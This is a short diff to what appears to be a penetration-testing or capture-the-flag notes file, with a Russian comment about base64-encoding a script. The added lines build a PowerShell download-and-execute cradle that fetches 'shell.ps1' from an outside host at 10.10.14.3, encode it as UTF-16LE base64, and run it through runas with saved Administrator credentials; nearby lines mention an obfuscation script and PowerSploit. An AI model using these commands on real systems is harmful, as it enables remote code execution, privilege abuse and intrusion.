@@ -18,6 +18,13 @@ exit
 
     sudo pwsh Invoke-Stealth.ps1
 
+# Кодируем скрипт в базе64 utf16 и запускаем
+
+echo -n "IEX(New-Object Net.Webclient).DownloadString('http://10.10.14.3/shell.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
+
+runas /user:ACCESS\Administrator /savecred "powershell -EncodedCommand <...base64...>"
+
+
 # POWER
 
 https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/
